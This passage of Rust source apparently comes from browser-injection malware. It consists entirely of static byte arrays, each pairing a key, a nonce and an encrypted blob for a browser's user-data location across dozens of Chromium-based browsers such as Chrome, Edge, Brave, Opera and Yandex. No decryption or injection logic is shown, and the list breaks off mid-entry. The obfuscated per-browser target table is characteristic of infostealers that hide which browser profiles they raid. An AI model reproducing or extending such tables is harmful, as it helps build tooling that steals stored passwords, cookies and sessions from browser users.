pub static INJ_PATH_YANDEX_APP_ENC: &[u8] = &[0xAA, 0x41, 0xD7, 0xE5, 0xCC, 0xCB, 0x43, 0x67, 0x6F, 0xBD, 0xAE, 0x5D, 0xC5, 0x8A, 0x1F, 0xC2, 0x27, 0x3A, 0x07, 0xBB, 0x36, 0x21, 0x99, 0xDA, 0xDD, 0x73, 0xF6, 0xB7, 0xA8, 0x6D, 0x02, 0xBF, 0xD7, 0x9F, 0xC4, 0x06, 0x86, 0x6D, 0xB6, 0x32, 0xFF, 0xC5, 0x7D, 0x55, 0x52, 0xBC, 0x6D, 0x13, 0x3C, 0x00, 0x18, 0x12, 0x70, 0xD0, 0xBE, 0xFF, 0x42, 0xAC, 0x6B, 0x5C];
pub static INJ_UD_CHROME_KEY: [u8; 32] = [0x6E, 0x7A, 0x5C, 0xD2, 0xC6, 0x81, 0xCB, 0x7D, 0x30, 0xFD, 0xDD, 0xF2, 0x39, 0xD1, 0xAF, 0x2B, 0xF0, 0x9E, 0xF8, 0x3E, 0xE7, 0xD1, 0x6D, 0x64, 0x11, 0x2A, 0x8C, 0xA2, 0xF8, 0x04, 0xD0, 0xCA];
pub static INJ_UD_CHROME_NONCE: [u8; 12] = [0x19, 0x9F, 0x3A, 0x34, 0x4E, 0xB2, 0x1C, 0x90, 0x7B, 0x45, 0xA3, 0x85];
pub static INJ_UD_CHROME_ENC: &[u8] = &[0x58, 0x1C, 0x12, 0x27, 0xA2, 0xD3, 0xB4, 0x61, 0x80, 0x4D, 0xE3, 0x31, 0x48, 0x8A, 0x99, 0x80, 0x2B, 0x00, 0x9F, 0xB4, 0xA6, 0x70, 0x14, 0xDE, 0xA4, 0x4C, 0x56, 0x67, 0xD0, 0xAB, 0x40, 0xC0, 0x34, 0x9D, 0x1C, 0x46, 0xD7, 0x2D, 0x20];
pub static INJ_UD_CHROME_BETA_KEY: [u8; 32] = [0x82, 0xCA, 0x1E, 0xF2, 0x8B, 0x6C, 0xD2, 0x7D, 0x03, 0x1C, 0x39, 0x9E, 0x72, 0x9B, 0x88, 0x49, 0x01, 0x1E, 0x02, 0x90, 0xA2, 0x9E, 0x84, 0x5C, 0xD0, 0xC3, 0x54, 0x1B, 0xED, 0xCB, 0x11, 0x27];
pub static INJ_UD_CHROME_BETA_NONCE: [u8; 12] = [0x39, 0x3E, 0x81, 0xB6, 0x3C, 0x29, 0x7B, 0x09, 0x34, 0x43, 0x75, 0x7F];
pub static INJ_UD_CHROME_BETA_ENC: &[u8] = &[0x8E, 0x70, 0x3E, 0x36, 0xAC, 0x70, 0x79, 0xD7, 0x58, 0x05, 0x06, 0xE9, 0xA4, 0xCA, 0xFB, 0x28, 0x99, 0xDA, 0x81, 0x1C, 0xDD, 0x73, 0x38, 0x82, 0x08, 0x98, 0xF7, 0x04, 0x80, 0xD2, 0x20, 0x4C, 0xAD, 0x5A, 0x0F, 0x94, 0x15, 0x9E, 0x5F, 0x99, 0x9F, 0x7A, 0xB4, 0x54];
pub static INJ_UD_CHROME_DEV_KEY: [u8; 32] = [0x12, 0x75, 0x83, 0x9F, 0x4A, 0x71, 0xAF, 0x9E, 0x14, 0x5E, 0x15, 0xF4, 0xB6, 0x70, 0x49, 0x93, 0xA7, 0xAC, 0x75, 0xF2, 0x39, 0x10, 0xFE, 0xE8, 0x4A, 0x56, 0x58, 0x5A, 0x77, 0x59, 0x10, 0xD9];
pub static INJ_UD_CHROME_DEV_NONCE: [u8; 12] = [0x0D, 0xAD, 0x78, 0x9A, 0x42, 0x53, 0x39, 0x73, 0xAA, 0xBA, 0xCE, 0x34];
pub static INJ_UD_CHROME_DEV_ENC: &[u8] = &[0xB4, 0x35, 0xCE, 0xB4, 0xB0, 0x48, 0x35, 0xA4, 0x92, 0x25, 0x2E, 0x18, 0x0F, 0x9B, 0x29, 0x8F, 0xAF, 0xEA, 0xCE, 0xDF, 0xAB, 0xCA, 0xC3, 0x45, 0x07, 0x03, 0x9C, 0x3A, 0x72, 0xBA, 0x67, 0xC8, 0xA2, 0x0A, 0x33, 0xD6, 0xC3, 0xFD, 0x6A, 0x6D, 0xE4, 0x35, 0x1B];
pub static INJ_UD_CHROME_CANARY_KEY: [u8; 32] = [0x09, 0x90, 0xB4, 0x4B, 0xBB, 0x92, 0x74, 0x78, 0xFB, 0x5D, 0xFB, 0x06, 0xE2, 0xD4, 0xFC, 0xEF, 0xBA, 0xAA, 0x8E, 0xB5, 0x15, 0xB0, 0xB8, 0xC0, 0x22, 0xDC, 0x45, 0x64, 0x1D, 0x80, 0x78, 0x63];
pub static INJ_UD_CHROME_CANARY_NONCE: [u8; 12] = [0xAD, 0x1A, 0x1E, 0x56, 0x67, 0x6E, 0x91, 0xB1, 0x3C, 0x3A, 0x8F, 0x7C];
pub static INJ_UD_CHROME_CANARY_ENC: &[u8] = &[0x6B, 0xE8, 0xD1, 0x8B, 0xDD, 0xDB, 0x88, 0x05, 0x91, 0xCA, 0xA3, 0x97, 0xFD, 0x54, 0x3E, 0x8C, 0xEB, 0x0A, 0x4B, 0xCB, 0xEF, 0xFE, 0xD6, 0x48, 0xF2, 0x1B, 0x12, 0xE4, 0x20, 0x75, 0x79, 0x8A, 0xC7, 0x40, 0x09, 0xD7, 0x00, 0x04, 0xE8, 0x2B, 0xDE, 0xF7, 0x40];
pub static INJ_UD_CHROMIUM_KEY: [u8; 32] = [0x05, 0xE8, 0x29, 0xFE, 0x61, 0xEF, 0x64, 0xAA, 0xC4, 0x2D, 0xC5, 0x20, 0x0E, 0xD3, 0xC1, 0xD2, 0x2B, 0xA5, 0x40, 0x3F, 0x58, 0x2F, 0x70, 0x06, 0x89, 0x94, 0x55, 0xD6, 0x69, 0xC7, 0xB1, 0xD5];
pub static INJ_UD_CHROMIUM_NONCE: [u8; 12] = [0xEE, 0xC5, 0x55, 0x0E, 0xCC, 0x49, 0x55, 0x11, 0xFE, 0x84, 0x8A, 0x14];
pub static INJ_UD_CHROMIUM_ENC: &[u8] = &[0x02, 0xD9, 0x8B, 0x14, 0x1A, 0x2D, 0x82, 0x04, 0x9E, 0x6B, 0x0F, 0x48, 0xA1, 0x92, 0x2B, 0x6A, 0x1F, 0x30, 0x57, 0x8F, 0x7B, 0x81, 0xEB, 0x78, 0x8E, 0x56, 0xEE, 0x69, 0x86, 0xDD, 0x2B, 0x4B, 0x45, 0xCE];
pub static INJ_UD_EDGE_KEY: [u8; 32] = [0x40, 0x54, 0xCD, 0xB6, 0xAF, 0x1D, 0x9F, 0x7C, 0x7B, 0x93, 0x33, 0x03, 0x84, 0x33, 0xD9, 0xD0, 0xF9, 0xF5, 0xD7, 0x70, 0x32, 0xC3, 0xF6, 0xB5, 0xA2, 0xBD, 0x2A, 0xC4, 0x02, 0x4C, 0x2B, 0x79];
pub static INJ_UD_EDGE_NONCE: [u8; 12] = [0x42, 0x7B, 0xA0, 0x81, 0xB9, 0xFE, 0x6E, 0x5E, 0x8B, 0x0D, 0xEA, 0xCC];
pub static INJ_UD_EDGE_ENC: &[u8] = &[0x4F, 0x12, 0xDF, 0xEF, 0x2F, 0x9C, 0xAB, 0xDF, 0xCB, 0xA0, 0xA3, 0xD9, 0x63, 0x15, 0xF6, 0x3C, 0x5C, 0xFE, 0x45, 0xE7, 0xD9, 0xA4, 0x0A, 0x81, 0xE3, 0x10, 0xA1, 0x94, 0x1F, 0x16, 0x45, 0x8D, 0xD4, 0xFF, 0x3F, 0xD6, 0xC5, 0xE8, 0xEA, 0x9A];
pub static INJ_UD_EDGE_BETA_KEY: [u8; 32] = [0xC3, 0x22, 0x2F, 0x2C, 0x65, 0x97, 0x91, 0xA9, 0x65, 0x3F, 0x8B, 0xEC, 0x51, 0xC9, 0xE5, 0xE6, 0xE5, 0x60, 0x63, 0x46, 0xD1, 0x4B, 0x45, 0x16, 0xB3, 0x09, 0xD9, 0x4C, 0xF8, 0xC4, 0x1C, 0x86];
pub static INJ_UD_EDGE_BETA_NONCE: [u8; 12] = [0xFE, 0x09, 0x85, 0x22, 0x5A, 0x29, 0xD7, 0x63, 0xC1, 0xCE, 0x66, 0x46];
pub static INJ_UD_EDGE_BETA_ENC: &[u8] = &[0xB8, 0xA0, 0x9F, 0x87, 0x53, 0xA5, 0xF4, 0xB1, 0xFE, 0xFC, 0x73, 0xD2, 0xBE, 0x42, 0x1B, 0x44, 0x03, 0x7D, 0x98, 0x7B, 0x46, 0x51, 0xAC, 0xE9, 0x88, 0x12, 0xDE, 0x8F, 0xA8, 0x11, 0x96, 0x1E, 0x1B, 0xBC, 0x97, 0x35, 0x60, 0x0D, 0x0A, 0x10, 0xF1, 0xA7, 0xCF, 0xB5, 0x71];
pub static INJ_UD_EDGE_DEV_KEY: [u8; 32] = [0xCD, 0x17, 0xF1, 0x6F, 0x3A, 0xA1, 0x0B, 0x08, 0xEE, 0x77, 0x17, 0x44, 0x4D, 0xC7, 0x60, 0xE9, 0x48, 0x06, 0xEA, 0x9C, 0x41, 0xA5, 0xA6, 0x9E, 0x16, 0x2D, 0x75, 0xFE, 0x9F, 0x6F, 0x5B, 0xE8];
pub static INJ_UD_EDGE_DEV_NONCE: [u8; 12] = [0x9A, 0x07, 0xCE, 0xB6, 0x1D, 0x43, 0xF7, 0x78, 0x7F, 0x71, 0x5C, 0x1B];
pub static INJ_UD_EDGE_DEV_ENC: &[u8] = &[0x1F, 0x46, 0xC0, 0x05, 0x14, 0xDB, 0xE5, 0x18, 0xA3, 0x34, 0x30, 0x99, 0xBD, 0x2B, 0x39, 0xB3, 0x67, 0x68, 0x47, 0xE2, 0xFE, 0x88, 0xC6, 0x0F, 0x68, 0xE6, 0xE0, 0x69, 0xE8, 0xC7, 0xCA, 0xE3, 0x09, 0x46, 0x46, 0xFC, 0xC8, 0x2D, 0x57, 0x90, 0xD2, 0xD4, 0x6D, 0x4C];
pub static INJ_UD_BRAVE_KEY: [u8; 32] = [0xC7, 0x97, 0x99, 0x2B, 0x96, 0x2E, 0x4F, 0x46, 0x10, 0x23, 0x71, 0x45, 0x6F, 0xE8, 0xE8, 0x1B, 0xDE, 0x8A, 0x3C, 0x22, 0xA5, 0x6F, 0xAB, 0x7A, 0x9C, 0xAB, 0x3A, 0xB9, 0xF8, 0xD3, 0x74, 0xDE];
pub static INJ_UD_BRAVE_NONCE: [u8; 12] = [0x8E, 0x62, 0x3C, 0x06, 0x80, 0xDD, 0xDD, 0xE4, 0x95, 0xC2, 0x46, 0x29];
pub static INJ_UD_BRAVE_ENC: &[u8] = &[0xE6, 0x55, 0x08, 0xE3, 0xB4, 0xDC, 0xCC, 0xE0, 0xF7, 0x9B, 0x8A, 0x21, 0x7C, 0xD0, 0xE4, 0xE9, 0xB4, 0x3C, 0xAE, 0x0D, 0x99, 0x0C, 0x42, 0x2A, 0xCF, 0x85, 0x8E, 0x71, 0x79, 0x31, 0x33, 0x9F, 0x85, 0x94, 0x66, 0x01, 0xC7, 0x30, 0x62, 0xE2, 0x33, 0x2F, 0xF5, 0x9C, 0xD7, 0x4F, 0x9A, 0xFA, 0xD6, 0xA6, 0x31, 0x68, 0x62];
pub static INJ_UD_BRAVE_BETA_KEY: [u8; 32] = [0x11, 0x4C, 0x44, 0x0C, 0xB6, 0xA5, 0xC9, 0xE5, 0x70, 0xE9, 0x97, 0x27, 0x63, 0x9E, 0x77, 0x2B, 0xC0, 0x5D, 0xBC, 0x35, 0x34, 0xAE, 0x19, 0xAE, 0x68, 0x25, 0xE0, 0x59, 0x64, 0x9F, 0x1D, 0x9D];
pub static INJ_UD_BRAVE_BETA_NONCE: [u8; 12] = [0x02, 0x4F, 0x66, 0xEE, 0x5D, 0x18, 0x0F, 0x69, 0xE3, 0x46, 0xE7, 0xA0];
pub static INJ_UD_BRAVE_BETA_ENC: &[u8] = &[0x0B, 0x5E, 0x7D, 0xB1, 0x29, 0x8A, 0xAE, 0x9D, 0x03, 0x34, 0x7C, 0xE8, 0xF1, 0xAD, 0x4D, 0x3F, 0xB1, 0x06, 0xCE, 0xB0, 0x58, 0x9E, 0x59, 0x90, 0xEC, 0x9C, 0xF6, 0xA0, 0xFC, 0x35, 0xE0, 0xB9, 0x90, 0x52, 0x35, 0xEA, 0xF0, 0x42, 0x70, 0x09, 0x82, 0x19, 0x70, 0x83, 0xCD, 0xB8, 0xF8, 0x8D, 0x41, 0xB7, 0x57, 0x22, 0x4B, 0xC4, 0xE7, 0x2A, 0x39, 0x2B];
pub static INJ_UD_BRAVE_NIGHTLY_KEY: [u8; 32] = [0x84, 0xE4, 0x5D, 0x93, 0xCD, 0x3F, 0x6B, 0x74, 0xD1, 0x8A, 0x2B, 0xA6, 0x9D, 0x72, 0xD7, 0xE9, 0x66, 0x0A, 0xC0, 0xE4, 0xB9, 0xC1, 0xD9, 0x8A, 0xC2, 0xAF, 0xF2, 0x0F, 0xBA, 0x54, 0xB4, 0xC0];
pub static INJ_UD_BRAVE_NIGHTLY_NONCE: [u8; 12] = [0xC0, 0x30, 0x9E, 0xDB, 0x63, 0x59, 0xB3, 0x27, 0x22, 0xB9, 0xCA, 0xCA];
pub static INJ_UD_BRAVE_NIGHTLY_ENC: &[u8] = &[0x17, 0x32, 0xE5, 0x8B, 0x31, 0x92, 0x23, 0x40, 0x7C, 0x26, 0xF8, 0x4C, 0x55, 0xEA, 0x0E, 0x32, 0x84, 0xEE, 0x22, 0x38, 0xEC, 0x2A, 0x3B, 0xF8, 0x67, 0x32, 0x49, 0x23, 0x94, 0x21, 0x23, 0xA5, 0xFE, 0xA5, 0xD6, 0x38, 0x10, 0x93, 0x0E, 0xE0, 0xC0, 0xEC, 0xB0, 0xB8, 0x1B, 0x0F, 0x01, 0x53, 0x93, 0x1A, 0xC1, 0xE3, 0xD9, 0x43, 0x55, 0x44, 0x8A, 0x94, 0x6B, 0x19, 0xB7];
pub static INJ_UD_OPERA_KEY: [u8; 32] = [0xD8, 0xE8, 0x17, 0xAB, 0xB6, 0xD4, 0xF2, 0x54, 0xC0, 0xCB, 0xE3, 0x79, 0x0D, 0x78, 0xCD, 0x20, 0x75, 0xC3, 0xB9, 0x7D, 0x4C, 0xC1, 0xCF, 0xC1, 0xDE, 0x6F, 0xC3, 0xDA, 0x98, 0x2A, 0xEC, 0x04];
pub static INJ_UD_OPERA_NONCE: [u8; 12] = [0xBB, 0xD4, 0xDB, 0xCD, 0x93, 0x00, 0xE8, 0x0F, 0x31, 0x5D, 0x10, 0x76];
pub static INJ_UD_OPERA_ENC: &[u8] = &[0x09, 0x57, 0x8F, 0xEA, 0xB4, 0x51, 0x3D, 0x39, 0x2A, 0x48, 0x0C, 0x80, 0xFA, 0xA4, 0x14, 0xA0, 0xB9, 0x6F, 0x62, 0xF3, 0x83, 0x1B, 0x3A, 0x52, 0xD2, 0x5B, 0x94, 0x01, 0x33, 0x0C, 0xBE, 0x8D, 0x18, 0xFC, 0x7B, 0x4C, 0xA4, 0x75, 0x8C, 0x00, 0xBA, 0xAC, 0x31];
pub static INJ_UD_OPERA_GX_KEY: [u8; 32] = [0x85, 0x00, 0xEB, 0xED, 0xF5, 0x6E, 0x68, 0x2C, 0xF2, 0x44, 0xFD, 0x3D, 0x4C, 0xC6, 0x3E, 0x5C, 0xE1, 0x05, 0x8D, 0xA3, 0x73, 0x20, 0x5D, 0x80, 0xC0, 0x4A, 0xF9, 0xF3, 0x00, 0xC7, 0xFA, 0xA1];
pub static INJ_UD_OPERA_GX_NONCE: [u8; 12] = [0x63, 0x5D, 0xF7, 0x9C, 0xBE, 0x5E, 0xB4, 0xC1, 0x99, 0x88, 0xAA, 0x50];
pub static INJ_UD_OPERA_GX_ENC: &[u8] = &[0x93, 0xD2, 0x03, 0x82, 0x4D, 0x53, 0x74, 0x50, 0xF6, 0xA1, 0x41, 0x40, 0x56, 0x58, 0x91, 0xA6, 0xF4, 0x04, 0xDC, 0x13, 0x40, 0x15, 0xC2, 0x46, 0xE8, 0x39, 0x53, 0x04, 0x52, 0x72, 0x9F, 0x54, 0x5D, 0xB5, 0xB4, 0xA8, 0x08, 0xEB, 0x1A, 0x19, 0x0C, 0x40, 0x0E, 0x55, 0x92, 0xAD];
pub static INJ_UD_OPERA_NEON_KEY: [u8; 32] = [0xF1, 0x2C, 0x00, 0xB6, 0xB4, 0x4F, 0x57, 0xD4, 0x3C, 0xC0, 0xA7, 0xF4, 0xE4, 0x50, 0x4A, 0x06, 0x9D, 0x3C, 0xCE, 0x5B, 0x91, 0x42, 0x54, 0x6C, 0x6A, 0xA3, 0x7B, 0xAA, 0x30, 0xC6, 0x9D, 0x21];
pub static INJ_UD_OPERA_NEON_NONCE: [u8; 12] = [0xDD, 0xDB, 0x73, 0xE1, 0xD2, 0x3F, 0x34, 0xFE, 0xE2, 0x3A, 0x30, 0x56];
pub static INJ_UD_OPERA_NEON_ENC: &[u8] = &[0xB0, 0xF5, 0x7B, 0x8F, 0x75, 0x57, 0x8D, 0xC1, 0xCF, 0xFB, 0x66, 0x04, 0xCC, 0xDB, 0xED, 0x43, 0x34, 0xED, 0x48, 0xB5, 0x67, 0x92, 0x65, 0x5D, 0xC1, 0x54, 0x2F, 0x51, 0x66, 0x82, 0x62, 0xF4, 0x92, 0xEF, 0x69, 0xF1, 0xD5, 0xBC, 0xB7, 0x70, 0x5E, 0xDA, 0xBD, 0x97, 0xF2, 0x64, 0x70, 0x73, 0x5D, 0xF9, 0xF9];
pub static INJ_UD_VIVALDI_KEY: [u8; 32] = [0xF8, 0x15, 0x5A, 0xDC, 0xED, 0xD1, 0x59, 0x8F, 0xC0, 0xAD, 0xB3, 0xD2, 0x35, 0xBF, 0x98, 0x39, 0xF5, 0xDE, 0xD2, 0xA6, 0xCF, 0xA9, 0x36, 0xA1, 0x34, 0x29, 0xDB, 0x7B, 0x75, 0xD7, 0xD7, 0x3B];
pub static INJ_UD_VIVALDI_NONCE: [u8; 12] = [0x8D, 0x9B, 0xC9, 0x7F, 0x7C, 0x89, 0xA2, 0xBC, 0x99, 0xBE, 0xEC, 0x24];
pub static INJ_UD_VIVALDI_ENC: &[u8] = &[0xF1, 0x97, 0xB4, 0x5D, 0x5D, 0xF4, 0x42, 0x22, 0x07, 0x28, 0x22, 0xE4, 0x51, 0x60, 0xA6, 0xC3, 0x93, 0xBE, 0x6A, 0xC4, 0xCB, 0x87, 0xB7, 0x6C, 0x58, 0x1D, 0x1A, 0x42, 0xA8, 0xA8, 0xFA, 0x4A, 0x62];
pub static INJ_UD_YANDEX_KEY: [u8; 32] = [0xB1, 0x38, 0xF4, 0x41, 0xEE, 0xFA, 0x1E, 0xC0, 0xED, 0x26, 0xB4, 0x86, 0x59, 0xBC, 0xC1, 0xE0, 0xB8, 0xEC, 0x73, 0xBB, 0x6B, 0x6E, 0x9E, 0x7C, 0xD2, 0xAB, 0x2E, 0x06, 0x1E, 0x0B, 0x6E, 0xF9];
pub static INJ_UD_YANDEX_NONCE: [u8; 12] = [0x2C, 0xC1, 0x2B, 0xA2, 0xC6, 0xEB, 0x5A, 0x1A, 0xD0, 0x44, 0xCF, 0x28];
pub static INJ_UD_YANDEX_ENC: &[u8] = &[0x62, 0x6F, 0x50, 0xEF, 0x73, 0x86, 0x24, 0xD9, 0x0D, 0x92, 0xDF, 0x92, 0x79, 0xC5, 0x5D, 0x4E, 0x35, 0x3A, 0xD8, 0x0F, 0xA7, 0xB1, 0x7E, 0x89, 0x8A, 0xCF, 0xB1, 0x6C, 0x5D, 0xBA, 0xF8, 0x3B, 0x45, 0x55, 0x8D, 0x12, 0x2E, 0x9B, 0x41, 0xEE, 0x6C, 0xA9, 0x10, 0xC6, 0xA2, 0x77];
pub static INJ_UD_COCCOC_KEY: [u8; 32] = [0xD9, 0xF8, 0x02, 0x41, 0xD8, 0xF6, 0x33, 0x1C, 0x91, 0xB8, 0xE3, 0xB0, 0x90, 0x47, 0x00, 0x15, 0x87, 0xF5, 0x47, 0x94, 0x0B, 0x97, 0xB2, 0xD0, 0xCD, 0x78, 0x4D, 0xBB, 0xC1, 0x38, 0xD7, 0x50];
pub static INJ_UD_COCCOC_NONCE: [u8; 12] = [0x10, 0xF9, 0x5B, 0x4F, 0xA4, 0x66, 0x72, 0x8F, 0x88, 0x34, 0xA6, 0xBE];
pub static INJ_UD_COCCOC_ENC: &[u8] = &[0x85, 0x1C, 0x00, 0xD1, 0xBB, 0x9B, 0x9C, 0xA2, 0xE3, 0xBA, 0xA0, 0x5F, 0x57, 0x52, 0x42, 0xC3, 0xA5, 0x0B, 0x1B, 0x2D, 0xD4, 0xA4, 0x07, 0x20, 0xC0, 0x7E, 0xA4, 0x72, 0x35, 0x5A, 0xA2, 0x1E, 0xD9, 0x98, 0xFE, 0x84, 0xDC, 0x43, 0xC0, 0x73];
pub static INJ_UD_CENT_KEY: [u8; 32] = [0xBA, 0xBB, 0x4F, 0x0C, 0xF3, 0x5D, 0xB8, 0x3A, 0xBF, 0x1A, 0xDD, 0x1C, 0x7F, 0x3C, 0xF0, 0x10, 0x95, 0x6D, 0xD2, 0x33, 0x11, 0x90, 0x96, 0x1C, 0xDB, 0x23, 0xEF, 0x8F, 0x4A, 0xA5, 0x45, 0x0E];
pub static INJ_UD_CENT_NONCE: [u8; 12] = [0x0F, 0x75, 0x58, 0x16, 0x60, 0x31, 0xB6, 0x7D, 0x2E, 0xE6, 0xEC, 0x36];
pub static INJ_UD_CENT_ENC: &[u8] = &[0xF3, 0x06, 0x4D, 0xAC, 0x9D, 0xAD, 0x9F, 0x6D, 0x70, 0x3B, 0xA3, 0x96, 0xD9, 0xB9, 0x9D, 0x4B, 0x1E, 0x73, 0x36, 0x89, 0x72, 0x76, 0x1B, 0xA9, 0xE8, 0x37, 0x05, 0x97, 0xE6, 0xAB, 0x48, 0xCF, 0xB3, 0xDC, 0xCC, 0x28, 0x08];
pub static INJ_UD_360CHROME_KEY: [u8; 32] = [0x09, 0x97, 0x95, 0xAB, 0xFB, 0x32, 0x2B, 0xB9, 0x1C, 0xAB, 0xF9, 0x05, 0x06, 0x78, 0x6A, 0xF9, 0x97, 0x18, 0xE4, 0xAF, 0xA5, 0x0B, 0x97, 0x2F, 0x23, 0x6E, 0x9E, 0xBF, 0x0D, 0x4B, 0x37, 0xE5];
pub static INJ_UD_360CHROME_NONCE: [u8; 12] = [0xED, 0x94, 0xF0, 0xB9, 0x51, 0x02, 0xC5, 0x01, 0x02, 0xCC, 0x53, 0x07];
pub static INJ_UD_360CHROME_ENC: &[u8] = &[0x81, 0x67, 0x4A, 0xA0, 0x90, 0xEB, 0xD4, 0xF2, 0xE6, 0x92, 0x43, 0xEC, 0x56, 0xF7, 0x96, 0xC1, 0x29, 0x21, 0x88, 0x6B, 0x93, 0x89, 0x65, 0xD4, 0x9E, 0x4A, 0x2D, 0xF1, 0x71, 0x65, 0x46, 0x78, 0x01, 0x13, 0x0E, 0x1F, 0x4D, 0x77, 0xE0, 0x4A, 0x11, 0xF5];
pub static INJ_UD_EPIC_KEY: [u8; 32] = [0x8B, 0x38, 0xB9, 0x75, 0x8F, 0xEF, 0x54, 0xC9, 0xD7, 0x42, 0xCC, 0xC4, 0x5D, 0x2E, 0x90, 0x38, 0x51, 0xCA, 0x09, 0xA4, 0x2B, 0xA0, 0xFF, 0x8F, 0x21, 0xE1, 0x71, 0xD0, 0xF1, 0x8F, 0x9D, 0xC9];
pub static INJ_UD_EPIC_NONCE: [u8; 12] = [0x13, 0xB1, 0x0A, 0x9D, 0x51, 0x4A, 0xF0, 0xBE, 0x1E, 0x53, 0x6E, 0xDA];
pub static INJ_UD_EPIC_ENC: &[u8] = &[0x13, 0x24, 0x17, 0x06, 0xC6, 0x40, 0x00, 0xB2, 0xE0, 0x3E, 0xC9, 0xF6, 0x99, 0x30, 0x7E, 0xBA, 0xCA, 0x26, 0x34, 0xD2, 0xDC, 0xE8, 0x44, 0xBA, 0x39, 0x75, 0xAB, 0x4D, 0x3D, 0xE3, 0xD9, 0xCF, 0x3A, 0xE3, 0x55, 0xE3, 0x70, 0x25, 0x1F, 0x93, 0x5B, 0x31, 0xE7, 0x09, 0x21, 0xEC];
pub static INJ_UD_URAN_KEY: [u8; 32] = [0x1D, 0x80, 0x4A, 0x3B, 0x01, 0x93, 0xD1, 0x97, 0x3C, 0x43, 0x06, 0x19, 0x4E, 0x4F, 0xC0, 0xA0, 0x31, 0x85, 0x4F, 0x5B, 0x90, 0x18, 0xDC, 0xE9, 0x7B, 0xAE, 0x08, 0x09, 0x5F, 0x0B, 0x97, 0xB6];
pub static INJ_UD_URAN_NONCE: [u8; 12] = [0xF8, 0x38, 0x64, 0x4E, 0x94, 0x9E, 0x26, 0xE7, 0x08, 0xB7, 0xBF, 0x97];
pub static INJ_UD_URAN_ENC: &[u8] = &[0x75, 0x5F, 0xA4, 0xD1, 0x02, 0xC7, 0xD6, 0xA2, 0xF6, 0xAE, 0x89, 0xEB, 0xB2, 0x17, 0xBF, 0x25, 0x4A, 0xF9, 0x97, 0x8A, 0x39, 0xD8, 0xA9, 0x10, 0xB6, 0x78, 0x57, 0xDC, 0xE3, 0xBF, 0x01, 0x71, 0x7E, 0x45, 0x1A, 0x97, 0x63, 0x89, 0x25, 0xB7];
pub static INJ_UD_7STAR_KEY: [u8; 32] = [0xF9, 0x82, 0x61, 0xBC, 0xAB, 0x9D, 0x84, 0x42, 0xAB, 0x9D, 0xE1, 0xBA, 0xF1, 0xFE, 0x1F, 0x58, 0x46, 0xD7, 0x4A, 0x3C, 0x4D, 0x6B, 0x28, 0x58, 0x3F, 0x46, 0xC9, 0x4E, 0xB2, 0x77, 0x01, 0xFF];
pub static INJ_UD_7STAR_NONCE: [u8; 12] = [0x4B, 0xFF, 0x98, 0xC5, 0x69, 0xD4, 0xE9, 0x97, 0x15, 0x50, 0x34, 0x40];
pub static INJ_UD_7STAR_ENC: &[u8] = &[0x39, 0xB3, 0x72, 0xF4, 0x46, 0x6B, 0xD5, 0x0F, 0x37, 0x07, 0x8E, 0xD4, 0x7D, 0xE1, 0xD0, 0xD2, 0x1F, 0xC0, 0x93, 0x52, 0x25, 0xB0, 0xEE, 0xED, 0xFE, 0x60, 0x79, 0x23, 0xD6, 0x44, 0xDF, 0x06, 0x17, 0x42, 0x1E, 0x12, 0xD6];
pub static INJ_UD_TORCH_KEY: [u8; 32] = [0x64, 0x7F, 0xE9, 0xB4, 0x6F, 0x1F, 0x7D, 0xB3, 0x3E, 0x20, 0x16, 0x15, 0xF4, 0x12, 0x2E, 0x2C, 0x81, 0x33, 0xA3, 0x4D, 0x31, 0x36, 0x1B, 0xEE, 0xE6, 0x4D, 0xF3, 0xEA, 0xE0, 0xF6, 0x20, 0xF9];
pub static INJ_UD_TORCH_NONCE: [u8; 12] = [0x5B, 0x41, 0xCE, 0xA7, 0x7A, 0x1E, 0xA4, 0x82, 0xA9, 0x1C, 0xA6, 0xF1];
pub static INJ_UD_TORCH_ENC: &[u8] = &[0x4C, 0x88, 0x7D, 0x4B, 0x8A, 0x74, 0x5F, 0xF1, 0x34, 0xEE, 0x3D, 0x54, 0xB0, 0xFF, 0x39, 0x3B, 0x77, 0x22, 0x83, 0xB7, 0x8B, 0x48, 0xA2, 0x72, 0x32, 0x0D, 0xAA, 0x29, 0xF7, 0xA4, 0xDB];
pub static INJ_UD_KOMETA_KEY: [u8; 32] = [0x61, 0x0F, 0x46, 0xD6, 0x78, 0xB1, 0xFD, 0xC7, 0x08, 0xFD, 0xB2, 0x4C, 0x9F, 0x5B, 0x59, 0x6E, 0x17, 0xCD, 0xF6, 0x20, 0x0E, 0x78, 0xC0, 0x30, 0x6F, 0xFC, 0xD8, 0xB8, 0xE1, 0x2D, 0x0B, 0x2D];
pub static INJ_UD_KOMETA_NONCE: [u8; 12] = [0xC9, 0xA1, 0x59, 0x29, 0xD2, 0xC9, 0x8C, 0x3C, 0x01, 0x0F, 0x92, 0x00];
pub static INJ_UD_KOMETA_ENC: &[u8] = &[0x24, 0xC5, 0x64, 0x44, 0x78, 0x18, 0x1A, 0x85, 0xB3, 0x83, 0x3E, 0xF0, 0xDA, 0xEC, 0x23, 0x53, 0xC0, 0x0C, 0x05, 0x78, 0xAC, 0x56, 0xA1, 0xA5, 0xA1, 0x03, 0x4C, 0x7F, 0xCF, 0x82, 0xD3, 0x76];
pub static INJ_UD_ORBITUM_KEY: [u8; 32] = [0x80, 0x88, 0xB5, 0x8D, 0xBA, 0xA8, 0x4C, 0xAF, 0x3E, 0xE4, 0x72, 0x55, 0x9D, 0xBF, 0x27, 0x97, 0x62, 0xA2, 0x2A, 0xFF, 0xE3, 0x70, 0x25, 0x5C, 0x3E, 0xB4, 0xF3, 0x1F, 0x27, 0x13, 0xA6, 0xAE];
pub static INJ_UD_ORBITUM_NONCE: [u8; 12] = [0xCE, 0xF0, 0xBA, 0xB1, 0x8E, 0xA6, 0xDB, 0x85, 0x29, 0x72, 0x09, 0x7D];
pub static INJ_UD_ORBITUM_ENC: &[u8] = &[0x41, 0x69, 0x6C, 0x8E, 0x10, 0x5A, 0xD1, 0x08, 0xB3, 0xB6, 0x6C, 0x40, 0x08, 0xD0, 0xF8, 0x96, 0xCD, 0x2B, 0xDB, 0x89, 0xB6, 0xF3, 0x92, 0xE2, 0x48, 0x5E, 0x0B, 0x70, 0x72, 0x9A, 0xE1, 0xC8, 0x69];
pub static INJ_UD_AMIGO_KEY: [u8; 32] = [0x3D, 0xFD, 0x3C, 0xD4, 0x2B, 0xE3, 0x80, 0xF9, 0x58, 0xFE, 0x1F, 0xAD, 0x11, 0xA9, 0xD7, 0x83, 0x07, 0x26, 0x79, 0x78, 0xD7, 0x4B, 0xC6, 0xA9, 0x37, 0x5F, 0x3D, 0x44, 0xB7, 0x79, 0xF2, 0x13];
